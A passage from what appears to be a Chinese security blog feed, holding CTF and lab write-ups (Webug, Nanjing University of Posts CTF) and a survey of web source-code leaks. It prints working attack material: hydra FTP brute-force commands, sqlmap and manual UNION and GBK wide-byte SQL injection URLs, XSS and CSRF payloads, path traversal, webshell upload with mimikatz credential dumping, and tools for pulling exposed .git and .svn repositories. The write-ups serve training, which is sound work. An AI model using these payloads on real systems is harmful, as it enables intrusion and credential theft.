4.点击start，观察响应体可以看出爆破成功密码为password ####7.在线扫描破解hydra 环境：Windows10（FileZilla Server搭建的ftp服务器）、kali linux（预装了hydra） 测试用户：test：123456 操作： 1）启动ftp服务，启动成功后可以使用我添加的测试账户登录ftp读取我电脑E盘的文件 2）使用hydra来进行爆破 命令为： hydra -L ./user.txt -P ./pass.txt -t 20 -vV -e ns 192.168.169.1 ftp -l LOGIN 小写，用于指定破解的用户，对特定用户破解 -L FILE 大写，用于指定用户的用户名字典 -p PASS 小写，用于指定密码破解，少用，一般是采用密码字典 -P FILE 大写，用于指定密码字典 -vV为显示详细的爆破过程 -e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探 最后加上目标ip以及需要进行爆破的协议即可 3）显示成功后进行登录验证，发现可以成功登录]]></content>
  </entry>
  <entry>
    <title><![CDATA[Webug渗透基础教程]]></title>
    <url>%2F2017%2F10%2F24%2FWebug%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[####普通的GET注入 解法一：使用sqlmap 1）sqlmap -u”http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot; -b –current-db –current-user 可以看到当前的数据库名称以及用户名称 2）sqlmap -u”http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot; -D pentesterlab –tables 可以看到pentesterlab中有那些数据表 3）sqlmap -u”http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot; -D pentesterlab -T flag –columns 显示出该表下的所有列 4）sqlmap -u”http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot; -D pentesterlab -T flag -C flag –dump 得到flag:204f704fbbcf6acf398ffee11989b377 解法二：手工进行注入 1）先通过order by 子句判断有几个字段。 http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1’ order by 1 –+ 当order by 后加数字为5的时候报错因而判断有4个表 2）爆数据库 http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39; UNION SELECT 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() –+ 3）爆表名 http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39; UNION SELECT 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 –+ 4）爆列名 http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39; UNION SELECT 1,2,3,group_concat(id,0x5e,flag) from flag –+ 参考： http://www.freebuf.com/articles/web/29942.html http://www.cnblogs.com/zlgxzswjy/p/6707433.html ####从图片中你能找到什么？ 1）首先从网站下载这个图片，之后你可以选择用winhex（windows平台使用）分析或者使用binwalk（linux平台）来分析，这里使用binwalk 2）先看看文件的构成，可以看到是有一个rar格式的文件在里面的 3）分离文件（当然你把文件后缀修改为rar也是可以的） 4）直接看123.txt的内容是：密码是123。之后post这个密码就好 他题没有出好，咱们的思路是没有问题的。 ####你看到了什么？ 1）题目不明确的时候就看源码，源码注释部分有扫目录的提示 2）使用工具扫描目录 其实这里存在一个小技巧，如果对方没有设置好apache的话会出现列目录的情况，这往往会泄露信息 3）看一眼诡异的test 4）然后就解答了 ####告诉你了FLANG是5位数 1）分析：先看源码无提示；再考虑注册等功能发现无解；最后考虑爆破 2）爆破无验证码所以使用burpsuite（此处示例使用）或者AWVS等工具均可，若有验证码则要考虑自己编写脚本。最后可以发现爆破结果为admin：admin123 3）登录发现没有flag（其实也是题目的问题，我们阅读源码即可发现） ####一个优点小小的特殊的注入 1）提示头注入，所以直接使用sqlmap进行注入，首先burp抓包然后保存在sqlmap中 2）分析：头注入可能出现的几个位置：X-Forwarded-For、User-agent、Referer、Cookie。此处没有出现X-Forwarded-For所以我将其加上先进行这个点的测试。运气不错直接报错。接下来进行注入，与第一题的手工注入过程类似进行注入即可，或者使用sqlmap进行注入（注入命令为：python .\sqlmap.py -r .\test.txt -p “X-Forwarded-For” text.txt文件的内容为你抓的包）。 最后成功注入得到flag 注释：其实你手里是有源代码的，源码看下从白盒角度分析你就可以得到tips在哪儿。这里是基础代码审计不过多解释(代码审计可以借助一些工具的比如我最喜欢的cobra)。 一下是使用cobra检测的结果： ####这关需要RMB购买哦 1）点开可以看到只有一个登陆框，查看源代码看是否有tips, 果真是有提示的： 2）跟着提示走，猜测是否可能为注入，但是当我访问链接 1http://172.16.188.129/pentest/test/2/index.php?url=123 却出现了弹出并显示成功跳转，没啥用，还是看下账号密码吧，第一题注入也可以看到这个账号密码。 3）账号：密码&gt;&gt;&gt;tom:123456登陆抓包可以控制金额进行买卖 ####越权 1）让修改密码所以目标就很明确了，我要越权修改别人的密码 8.csrf 题目已经提示了是csrf所以我门使用burpsuite抓包然后直接生成PoC即可。 我们可以来测试一下效果： 首先我们访问我们的PoC 之后点击submit便可以看到提示修改密码成功： ####URL跳转 看到题目的提示我突然想到前面在源码中看到的一个提示： 1&lt;a href=&quot;index.php?url=#&quot;&gt;I&lt;/a&gt; 从这里顿时想到了跳转的原理，所以我们只需要这样做就可以访问百度了： 1172.16.188.129/pentest/test/5/index.php?url=https://www.baidu.com/ ####文件下载 直接访问发现是404，感觉有问题，还以为是要扫描发现某些文件，但发现不是，便去服务器看了下题目源码： 可以看到这个index.php是有问题的，所以我们直接看download.php即可 觉得没有方向的话还是先看源码或者抓包看有没有提示，很巧在源码中我们可以看到有个tips：帮管理员找回mysql帐号密码。通过文件下载找管理员密码，那么可以判断此处应该是任意文件下载漏洞。而要找到管理员的密码我们肯定是要先下载数据库配置文件之后看情况来判断是否需要下载数据库文件。通过之前那个题我们知道这个靶场的apache没有配置好导致文件路径泄漏的问题。所以我们来手动翻一翻。 发现data这个路径下什么都没有，所以是不是可能存在一个跟data同级的目录（其实刚才看源码我都看到了） 成功发现config.php，之后我们构造PoC进行下载： 1http://172.16.188.129/pentest//test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php 之后打开就可以找到密码了，并不需要进一步对数据库做什么。 ####我和上题有点像 这个和上面几乎一样，只不过参数的提交方式变了而已，我们用burp抓包然后修改pic参数即可。 ####我系统密码忘记了 1）使用账号密码：tom；123456进行登录，登录后发现可以上传文件，所以便尝试上传webshell 2）发现没有任何过滤，所以之后使用cknife进行连接 3）上传mimikatz抓取管理员密码即可 ####xss 无任何过滤的一个反射型xss 1http://172.16.188.129/pentest/test/9/?id=%3Cscript%3Ealert(%27npusec%27)%3C/script%3E ####存储型xss 也是不存在任何的过滤，只需要在留言处填写： 1&lt;script&gt;alert(/npusec/)&lt;/script&gt; ####什么？图片上传不了？ 1）上传一张图片 2）上传php脚本 3）不能是图片还不能是脚本，我们看下处理的逻辑： 123456789101112131415161718if(strstr($_FILES["file"]["type"],"image")&amp;&amp;strstr($_FILES["file"]["name"],"php"))&#123; if (file_exists("upload/" . $_FILES["file"]["name"])) &#123; echo $_FILES["file"]["name"] . " already exists. "; &#125; else &#123; move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]); echo "Stored in: " . "upload/" . $_FILES["file"]["name"]; &#125;&#125;else if(strstr($_FILES["file"]["name"],"png")||strstr($_FILES["file"]["name"],"jpg")||strstr($_FILES["file"]["name"],"jpeg")||strstr($_FILES["file"]["name"],"bmp")||strstr($_FILES["file"]["name"],"gif"))&#123; echo "&lt;font color='red'&gt;你真的上传了图片,可是这张图片我不喜欢,能换张吗?&lt;/font&gt;";&#125;else&#123; echo "&lt;font color='blue'&gt;你居然不上传图片,宝宝怒了!!&lt;/font&gt;";&#125;echo "&lt;hr/&gt;"; 4）根据代码来判断文件的type要为image、其次文件name要有php： ####明天双十一 源码如下： 1234567891011121314151617if(strstr($url,"www.taobao.com"))&#123; if($_SERVER['HTTP_HOST']=="10.10.10.10")&#123; if(strstr($_SERVER['HTTP_REFERER'],"www.baidu.com"))&#123; if(strstr($_SERVER['HTTP_REFERER'],"www.baidu.com"))&#123; echo "剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0"."&lt;br/&gt;"; &#125;else&#123; echo "不想剁手了"."&lt;br/&gt;"; &#125; &#125;else&#123; echo "nono"."&lt;br/&gt;"; &#125; &#125;else&#123; echo "哎呀，这里只允许10.10.10.10访问！！！"."&lt;br/&gt;"; &#125; &#125;else&#123; echo "这个地方剁手不好，换个地方！"; &#125; 一目了然，只需要将几个关键地方设置正确即可：]]></content>
  </entry>
  <entry>
    <title><![CDATA[南京邮电CTF题解]]></title>
    <url>%2F2017%2F10%2F24%2F%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5CTF%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[源码分析nctf{flag_admiaanaaaaaaaaaaa} php的弱类型加MD5碰撞首先考察post提交数据，然后考察md5碰撞，MD5加密QNKCDZ0可以看到是0exxxxxxxxx之类的字符，你只需要找到一个字符串，md5加密后是0e开头就好了。例如： aabg7XSs flag nctf{md5_collision_is_easy} 绕过长度限制考察html中的一些知识，在此直接用开发者工具修改即可 nctf{follow_me_to_exploit} 基本图片隐写术macos下类似winhex的软件有http://ridiculousfish.com/hexfiend/ nctf{photo_can_also_hid3_msg} 源码分析进阶访问连接，没看出端倪，直接用burpsuite的spider模块爬了一下，结果发现404.html，访问之后查看源代码，进而发现端倪。 nctf{this_is_a_fl4g} js的AAencode其实已经提示是AAencode了，想办法解密就行。比如你可以再http://tool.isex.ren/aadecode这个网站进行解密。机密结果就是flag（有人说浏览器打开是乱码，这样的话你wget下载，然后记事本打开就行） alert(“nctf{javascript_aaencode}”) 单身拼手速我觉得是题目没有出好，我直接在burpsuite中抓包就看到了flag 当然也可能是出好了，考察的就是跳转 nctf{yougotit_script_now} 你从哪里来一看就知道是改referer，因为在http头中来源地就是这个参数，在hackbar中修改了就行。 nctf{http_referer} php decode1&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt; 修改为如下代码，运行即可： 123456789101112131415&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;echo(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt; 其实我觉得这个不是在考代码审计，因为你echo一下就有flag了。但是还是说下这个解密。具体参考这个文章https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html 文件包含参考如下文章，构造http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php http://www.2cto.com/article/201311/258420.html 实在不会我们还有工具：https://github.com/D35m0nd142/LFISuite 单身一百年也没用考察302跳转：http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html 做题用burp抓包放repeater就行，其实用curl也可以 例如我用curl命令来做一下，其实这个源码也很好猜的 12345678910111213141516171819➜ ~ curl -i http://chinalover.sinaapp.com/web9/index.phpHTTP/1.1 302 FoundServer: saeDate: Mon, 11 Sep 2017 08:29:53 GMTContent-Type: text/htmlContent-Length: 0Connection: keep-aliveflag: nctf&#123;this_is302redirect&#125;Location: http://chinalover.sinaapp.com/web8/no_key_is_here_forever.phpVia: 1566 Download~!提示了文件下载，可以联想到任意文件下载漏洞，这样的话我们可以顺利的下载网站的源码进行审计的。我们先下载download.php（文件名是base64编码的），之后我们可以看到还有一个hereiskey.php，继续下载即可得到flag:nctf{download_any_file_666} download.php的源码如下： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phperror_reporting(0);include(&quot;hereiskey.php&quot;);$url=base64decode($GET[url]);if( $url==&quot;hereiskey.php&quot; || $url==&quot;buxiangzhangda.mp3&quot; || $url==&quot;xingxingdiandeng.mp3&quot; || $url==&quot;download.php&quot;)&#123; $file_size = filesize($url); header ( &quot;Pragma: public&quot; ); header ( &quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot; ); header ( &quot;Cache-Control: private&quot;, false ); header ( &quot;Content-Transfer-Encoding: binary&quot; ); header ( &quot;Content-Type:audio/mpeg MP3&quot;); header ( &quot;Content-Length: &quot; . $file_size); header ( &quot;Content-Disposition: attachment; filename=&quot;.$url); echo(file_get_contents($url)); exit;&#125;else &#123; echo &quot;Access Forbidden!&quot;;&#125;?&gt; COOKIE看到提示0==not，果断抓包把0改成1，然后就有了flag flag:nctf{cookie_is_different_from_session} MYSQL提示让看robots.txt 然后看到源码 1&lt;?phpif($GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;)); if ($_GET[id]==1024) &#123; echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 其实在此处是考察mysql中的一个精度问题，比如2014.1虽然在php中哦按段不等于2014，但是再查询时，加入mysql设置id为整型，那么2014.1就会变成2014。 the flag is:nctf{query_in_mysql} sql injection 3其实看到连接就知道是gbk的问题了，后面提示也有 your sql:select id,title from news where id = ‘2’ gbk_sql_injection 关于宽字节注入问题可以看这个文章： http://www.91ri.org/8611.html https://www.2cto.com/article/201301/182881.html 你可以手动来做： 1http://chinalover.sinaapp.com/SQL-GBK/index.php?id=ß&apos; union select 1,database() # your sql:select id,title from news where id = ‘運’ union select 1,database() #’ sae-chinalover 1http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 your sql:select id,title from news where id = ‘id=運’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #’ ctf,ctf2,ctf3,ctf4,news 1http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23 your sql:select id,title from news where id = ‘運’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 #’ id,flag 1http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(id,0x3a,flag) from ctf4 %23 your sql:select id,title from news where id = ‘運’ union select 1,group_concat(id,0x3a,flag) from ctf4 #’ 1:nctf{gbk_3sqli} /x00看标题就知道这个是在考察00截断 分析下这段代码 1if (isset ($GET[&apos;nctf&apos;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $GET[&apos;nctf&apos;]) === FALSE) echo &apos;必须输入数字才行&apos;; else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) die(&apos;Flag: &apos;.$flag); else echo &apos;骚年，继续努力吧啊~&apos;; &#125; ereg(mode, string subject, array regs); mode：正则表达式（preg_match中的mode必须以’/‘开始和“/”结束） subject： 需要验证的字符串 matchs/regs： 匹配后得到的结果。以数组的形式存储 strpos() 函数查找字符串在另一字符串中第一次出现的位置。 构造： http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu 网上也有说构造 http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]= 这个原因是因为报错并返回null（多亏了wonderkun大佬） bypass again这个题跟上面那个是不一样的，注意是=== 所以姿势如下：http://www.cnblogs.com/weidiao/p/6821812.html http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c 变量覆盖看下代码 1234567891011121314151617&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt;&lt;?php &#125; ?&gt; extract()出现的问题，详情见： http://www.cnblogs.com/sqyysec/p/6926095.html 构造： pass=1&amp;thepassword_123=1 post方式提交就行（使用hackbar和burp均可） PHP是世界上最好的语言http://way.nuptzj.cn/php/index.txt看到源代码 12345678910111213&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123; echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;&#125;?&gt; id的内容要跟hackerDJ不相同，但是urldecode之后要和hackerDJ相同 其实在此处考察的是$_GET[]本身就有urldecode的功能，所以构造：%2568ackerDJ即可 nctf{php_is_best_language} 伪装者看到这句“管理系统只能在本地登陆”就知道了 抓包增加：X-Forwarded-For: 127.0.0.1 nctf{happy_http_headers} Headerflag在响应头中，用burp看下就行 nctf{tips_often_hide_here} 上传绕过这题网上大多都写错了，有必要一写。 首先我们上传1.png（但实际文件内容写的是php一句话） 上传成功，我们可以知道与文件内容无关。重要的是：最终路径是拼接了 dir 和 filename 的，那么我们在 dir 处 00 截断为 .php 即可绕过。 具体的方式为用burp在hex中将空格20修改为00 nctf{welcome_to_hacks_world} SQL注入1知道了是post注入之后我们看代码就好 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; echo &apos;&lt;/br&gt;&apos;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt; trim()是去除两侧空格，重点在于依据下面这句进行构造 $sql=”select user from ctf where (user=’”.$user.”‘) and (pw=’”.$pass.”‘)”; 构造：admin’)#即可， ‘)用来分别用来闭合 #用来把后面给注释掉 nctf{ni_ye_hui_sql?} pass check来继续审计： 1234567891011121314&lt;?php$pass=@$_POST[&apos;pass&apos;];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo &quot;flag:nctf&#123;*&#125;&quot;;&#125;else&#123;echo &quot;the pass is wrong!&quot;;&#125;&#125;else&#123;echo &quot;please input pass!&quot;;&#125;?&gt; strcmp() 函数比较两个字符串。依据提示我们需要构造pass与pass1相等才行，但是我又不知道pass1，但是strcmp()比较，若相等返回0！但是null和0是等价的，所以我们让其返回null即可。构造：pass[]=hack 把这个post上去就行 flag:nctf{strcmp_is_n0t_3afe} 起名字真难审计！ 123456789101112131415161718192021&lt;?php function noother_says_correct($number)&#123; $one = ord(&apos;1&apos;);//ord() 函数返回字符串的首个字符的 ASCII 值。 $nine = ord(&apos;9&apos;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &apos;54975581388&apos;;&#125;$flag=&apos;*******&apos;;if(noother_says_correct($_GET[&apos;key&apos;])) echo $flag;else echo &apos;access denied&apos;;?&gt; 要求：id中的字符串不能有数字，而想得到flag又要进去的是要数字 构造：54975581388的16进制 0xccccccccc 提交得到flag:nctf{follow_your_dream} 密码重置其中涉及了URL编码和base64编码，burp抓包修改成admin就行 nctf{reset_password_often_have_vuln} .php反序列化审计！ 12345678910111213141516171819202122232425&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;if (isset($_GET[&apos;pass&apos;])) &#123; $pass = $_GET[&apos;pass&apos;]; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); if ($o) &#123; $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&apos;t fool me&quot;; &#125; else echo &quot;are you trolling?&quot;;&#125;?&gt; 题目的意思就是一个序列化过后的字符串与类中的变量始终保持相同，可以想到引用a=&amp;b （这可以当成一个专题讲讲） 1.php的内容 123456789101112131415161718192021&lt;?php class just4fun &#123; var $enter; var $secret; function just4fun() &#123; $this-&gt;enter=&amp;$this-&gt;secret; &#125; &#125; echo serialize(new just4fun()); ?&gt; 执行一下 123➜ Desktop php 1.phpO:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125; 构造： http://115.28.150.176/php1/index.php?pass=O:8:”just4fun”:2:{s:5:”enter”;N;s:6:”secret”;R:2;} 得到flag nctf{serialize_and_unserialize} sql injection 4审计！ 1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require &apos;db.inc.php&apos;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123;//当 magic_quotes_gpc 打开时，所有的 ’ (单引号), ” (双引号), \ (反斜线) and 空字符会自动转为含有反斜线的转义字符 $str=stripslashes($str);//与stripslashes()搭配使用，此函数是删除所有的\的 &#125; return htmlentities($str, ENT_QUOTES);//htmlentities($str, ENT_QUOTES)是指编码所有的双引号和单引号&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;);&#125;echo $flag;--&gt; 重点在于： 在这里由于’被转编码，所以可以使用\转义 $query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;; 构造：http://chinalover.sinaapp.com/web15/index.php?username=admin\&amp;password=%20or%201%23 插入后大致的sql语句为：SELECT * FROM users WHERE name=’ admin\’ AND pass=’ or 1#’; 综合题zh个很有意思，首先是一个jsfuck，不用解码，直接执行就可以 执行后得到：1bc29b36f623ba82aaf6724fd3b16718.php 打开发现不是这回事 又看提示，想到bash的一些相关，再看这个网页的header发现tip “history of bash” bash_history是用来存放历史记录的，所以我们就访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 又得到提示：zip -r flagbak.zip ./* 那么就访问这个： http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip 下载解压得到flag is:nctf{bash_history_means_what} 有源码给了题目的源码，可以自己搭建环境来尝试 https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB SQL注入2审计！ 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; strcasecmp是不分大小比较，这样只要得到密码md5值相同即可，提示已经说了用union所以我们来构造payload： username填写’ union select md5(1)# password填写1 得flag：ntcf{union_select_is_wtf} 剩余的题目不建议小白来做，想做的看这个链接 http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9 或者： https://www.40huo.cn/blog/nctf-writeup.html （ps：东西太多写不动了。。。） 总结：可以写点base64、base32、url编码解码、文本与16进制转换的小工具。&lt;&lt;&lt;可以练手，但是hackbar带全了和burp]]></content>
  </entry>
  <entry>
    <title><![CDATA[常见Web源码泄露总结]]></title>
    <url>%2F2017%2F01%2F25%2F%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[背景本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。 源码泄漏分类.hg源码泄漏漏洞成因：hg init的时候会生成.hg e.g.http://www.example.com/.hg/ 漏洞利用：工具：dvcs-ripper 1rip-hg.pl -v -u http://www.example.com/.hg/ .git源码泄漏漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 e.g. http://www.example.com/.git/config 漏洞利用：工具： GitHack 1GitHack.py http://www.example.com/.git/ dvcs-ripper 1rip-git.pl -v -u http://www.example.com/.git/ .DS_Store文件泄漏漏洞成因:在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 漏洞利用:http://www.example.com/.ds_store 注意路径检查 网站备份压缩文件 在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。 工具： ds_store_exp 1python ds_store_exp.py http://www.example.com/.DS_Store 漏洞成因及危害:该漏洞的成因主要有以下两种： 服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。 编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。 漏洞检测该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。 123456789101112131415.rar.zip.7z.tar.gz.bak.swp.txt.html 解决方案1find . -name ".DS_Store" -print0 | xargs -0 rm -rf #递归删除".DS_Store"文件 SVN导致文件泄露简介：Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。 Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。 e.g.http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries 漏洞利用:工具： dvcs-ripper 1rip-svn.pl -v -u http://www.example.com/.svn/ Seay-Svn WEB-INF/web.xml泄露简介：WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 WEB-INF主要包含一下文件或目录： /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件 漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。 一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！ CVS泄漏漏洞利用测试的目录 123http://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构 取回源码的命令 1bk clone http://url/name dir 这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。 查看所有的改变的命令，转到download的目录 1bk changes Bazaar/bzr漏洞利用工具： dvcs-ripper 1rip-bzr.pl -v -u http://www.example.com/.bzr/ 神器Bitkeeper) weakfilescan 参考https://zhuanlan.zhihu.com/p/21296806?refer=Anonymous0 http://www.s2.sshz.org/post/source-code-leak/]]></content>
  </entry>
  <entry>
    <title><![CDATA[PORT=>服务/漏洞]]></title>
